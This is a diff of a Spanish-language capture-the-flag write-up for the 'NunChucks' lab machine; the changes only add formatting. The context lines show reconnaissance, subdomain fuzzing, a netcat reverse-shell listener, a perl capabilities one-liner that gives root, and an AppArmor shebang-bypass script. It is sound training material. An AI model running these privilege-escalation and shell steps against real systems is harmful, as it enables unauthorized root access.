@@ -28,13 +28,13 @@ image:
   
 ## Descripción
 
-NunChucks es una máquina easy linux donde estaremos vulnerando la máquina a través de una server side template injection encontrada en su página web, obtendremos acceso a la máquina víctima explotando el ssti. Escalaremos privilegios aprovechando un bug de AppArmor
+`NunChucks` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de una `server side template injection` encontrada en su página web, obtendremos `acceso` a la `máquina víctima` explotando el `ssti`. Escalaremos privilegios aprovechando un `bug` de `AppArmor`
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.95.252
@@ -48,7 +48,7 @@ rtt min/avg/max/mdev = 58.658/58.658/58.658/0.000 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.95.252 -oG openPorts
@@ -69,7 +69,7 @@ PORT    STATE SERVICE
 443/tcp open  https
 ```
 
-Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p22,80,443 10.129.95.252 -oN services
@@ -110,7 +110,7 @@ Nos dirigimos a la página web y se visualiza lo siguiente:
 
 ![](/assets/img/NunChucks/image_1.png)
 
-La web posee virtual hosting por lo tanto debemos añadir el dominio nunchucks.htb al /etc/hosts
+La web posee `virtual hosting` por lo tanto debemos añadir el dominio `nunchucks.htb` al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -128,7 +128,7 @@ Al acceder a la web vemos lo siguiente
 
 ![](/assets/img/NunChucks/image_2.png)
 
-Podemos registrarnos en https://nunchucks.htb/signup
+Podemos registrarnos en `https://nunchucks.htb/signup`
 
 ![](/assets/img/NunChucks/image_3.png)
 
@@ -136,7 +136,7 @@ Al intentar registrarnos no nos deja
 
 ![](/assets/img/NunChucks/image_4.png)
 
-Para ver como se tramita la petición, abrimos el burpsuite y no damos cuenta que se está enviando un json a la dirección de la api
+Para ver como se tramita la `petición`, abrimos el `burpsuite` y no damos cuenta que se está enviando un `json` a la dirección de la `api`
 
 ![](/assets/img/NunChucks/image_5.png)
 
@@ -144,19 +144,19 @@ Esto también se puede hacer desde el navegador, desde la pestaña network
 
 ![](/assets/img/NunChucks/image_6.png)
 
-Podemos iniciar sesión en https://nunchucks.htb/login
+Podemos iniciar sesión en `https://nunchucks.htb/login`
 
 ![](/assets/img/NunChucks/image_7.png)
 
-Al probar iniciar sesión nos dice que está actualmente deshabilitado
+Al probar iniciar sesión nos dice que está actualmente `deshabilitado`
 
 ![](/assets/img/NunChucks/image_8.png)
 
-Al iniciar intentar iniciar sesión vemos otro endpoint de la api
+Al iniciar intentar iniciar sesión vemos otro `endpoint` de la `api`
 
 ![](/assets/img/NunChucks/image_9.png)
 
-Hemos fuzzeado el dominio nunchucks.htb en busca de nuevas rutas y no hemos encontrado nada interesante, por lo tanto como estamos ante un virtual hosting, he fuzzeado en busca de subdominios y he encontrado el subdominio store.nunchucks.htb
+Hemos `fuzzeado` el dominio `nunchucks.htb` en busca de nuevas `rutas` y no hemos encontrado nada interesante, por lo tanto como estamos ante un `virtual hosting`, he `fuzzeado` en busca de `subdominios` y he encontrado el subdominio `store.nunchucks.htb`
 
 ```
 # wfuzz -c -t200 --hh 30587 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.nunchucks.htb' https://nunchucks.htb 
@@ -175,7 +175,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000081:   200        101 L    259 W      4028 Ch     "store"    
 ```
 
-Añadimos store.nunchucks.htb al /etc/hosts
+Añadimos `store.nunchucks.htb` al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -189,15 +189,15 @@ ff02::2 ip6-allrouters
 
 ```
 
-Cuando accedemos a store.nunchucks.htb vemos lo siguiente
+Cuando accedemos a `store.nunchucks.htb` vemos lo siguiente
 
 ![](/assets/img/NunChucks/image_10.png)
 
-Al introducir un correo en y darle a notify me, nos aparece lo siguiente
+Al introducir un `correo` en y darle a `notify me`, nos aparece lo siguiente
 
 ![](/assets/img/NunChucks/image_11.png)
 
-Al verse reflejado nuestro input en una parte de la web y vemos que por detrás está corriendo express y node.js, podríamos probar a ver si existe un ssti
+Al verse reflejado nuestro `input` en una parte de la `web` y vemos que por detrás está corriendo express y `node.js`, podríamos probar a ver si existe un `ssti`
 
 ![](/assets/img/NunChucks/image_12.png)
 
@@ -207,11 +207,11 @@ Efectivamente nos encontramos antes un ssti
 
 ## Intrusión
 
-Al estar corriendo node.js, he buscado en hacktricks y he dado con el template al que nos podríamos estar enfrentando, este template se llama nunjucks [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks). Vamos a capturar la petición mediante burpsuite para poder explotar mejor esta vulnerabilidad
+Al estar corriendo `node.js`, he buscado en `hacktricks` y he dado con el template al que nos podríamos estar enfrentando, este template se llama `nunjucks` [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks). Vamos a `capturar` la `petición` mediante `burpsuite` para poder explotar mejor esta vulnerabilidad
 
 ![](/assets/img/NunChucks/image_14.png)
 
-He probado los payloads de la página de hacktricks sin embargo, no funcionan correctamente debido a que le estamos mandando el payload en un json y las comillas dan conflictos, por lo tanto he usado PentestGPT para obtener un payload alternativo para poder leer el /etc/passwd
+He probado los `payloads` de la página de `hacktricks` sin embargo, `no funcionan` correctamente debido a que le estamos mandando el `payload` en un `json` y las `comillas` dan `conflictos`, por lo tanto he usado `PentestGPT` para obtener un payload `alternativo` para poder leer el `/etc/passwd`
 
 {% raw %}
 ```
@@ -221,7 +221,7 @@ He probado los payloads de la página de hacktricks sin embargo, no funcionan co
 
 ![](/assets/img/NunChucks/image_15.png)
 
-Ahora vamos a establecernos unas reverse shell a nuestro equipo, le he pedido a PentestGPT que me adapte el payload para establecerme una reverse shell que se encuentra en la página de hacktricks
+Ahora vamos a establecernos unas `reverse shell` a nuestro equipo, le he pedido a `PentestGPT` que me `adapte` el `payload` para establecerme una `reverse shell` que se encuentra en la página de `hacktricks`
 
 {% raw %}
 ```
@@ -231,7 +231,7 @@ Ahora vamos a establecernos unas reverse shell a nuestro equipo, le he pedido a 
 
 ![](/assets/img/NunChucks/image_16.png)
 
-Una vez en la máquina víctima vamos a realizar un tratamiento a la TTY
+Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`
 
 ```
 # nc -nlvp 4444                                 
@@ -242,14 +242,14 @@ bash: no job control in this shell
 david@nunchucks:/var/www/store.nunchucks$ 
 ```
 
-Obtenemos las dimensiones de nuestra pantalla 
+Obtenemos las `dimensiones` de nuestra `pantalla` 
 
 ```
 # stty size
 45 183
 ```
 
-Efectuamos el tratamiento a la TTY
+Efectuamos el `tratamiento` a la `TTY`
 
 ```
 # script /dev/null -c bash
@@ -267,7 +267,7 @@ Efectuamos el tratamiento a la TTY
 [ENTER]
 ```
 
-Ya tenemos un consola completamente interactiva
+Ya tenemos un `consola` completamente `interactiva`
 
 ```
 david@nunchucks:/var/www/store.nunchucks$ whoami
@@ -276,7 +276,7 @@ david
 
 ## Privilege Escalation
 
-Al listar capabilities nos damos cuenta que con perl podríamos escalar privilegios
+Al listar `capabilities` nos damos cuenta que con `perl` podríamos `escalar privilegios`
 
 ```
 david@nunchucks:/tmp/scripts$ getcap -r / 2>/dev/null
@@ -287,14 +287,14 @@ david@nunchucks:/tmp/scripts$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-Debido a que perl tiene esa capabilities podemos ejecutar comandos como usuario root, sin embargo, parece que algunos binarios no los podemos ejecutar
+Debido a que `perl` tiene esa capabilities podemos ejecutar comandos como usuario `root`, sin embargo, parece que algunos `binarios` no los podemos `ejecutar`
 
 ```
 david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
 root
 ```
 
-Esto se parece bastante a SELinux, no encontramos nada en el sistema que diga que está instalado. Buscando alternativas a SELinux he encontrado AppArmor, si buscamos en el sistema nos daremos cuenta de que se encuentra instalado
+Esto se parece bastante a `SELinux`, no encontramos nada en el sistema que diga que está instalado. Buscando `alternativas` a `SELinux` he encontrado `AppArmor`, si buscamos en el sistema nos daremos cuenta de que se encuentra `instalado`
 
 ```
 find / -type f -name '*apparmor*' 2>/dev/null
@@ -326,7 +326,7 @@ find / -type f -name '*apparmor*' 2>/dev/null
 /usr/src/linux-headers-5.4.0-81-generic/include/config/default/security/apparmor.h
 ```
 
-Nos metemos en el directorio donde los están perfiles de AppArmor y visualizamos el perfil de perl
+Nos metemos en el directorio donde los están perfiles de `AppArmor` y visualizamos el `perfil` de `perl`
 
 ```
 david@nunchucks:/etc$ cd /etc/apparmor.d
@@ -359,7 +359,7 @@ david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
 }
 ```
 
-En Hacktricks encontramos un artículo sobre como bypassear la seguridad de AppArmor mediante el shebang [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass)
+En `Hacktricks` encontramos un artículo sobre como `bypassear` la seguridad de `AppArmor` mediante el `shebang` [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass)
 
 ```
 david@nunchucks:/tmp$ echo '#!/usr/bin/perl
@@ -373,7 +373,7 @@ david@nunchucks:/tmp$ /tmp/test.pl
 root
 ```
 
-En /opt nos encontramos dos archivos interesantes, el archivo backup.pl también se aprovecha de este bug para ejecutarse como usuario root
+En `/opt` nos encontramos dos archivos interesantes, el archivo `backup.pl` también se aprovecha de este bug para `ejecutarse` como usuario `root`
 
 ```
 # ls
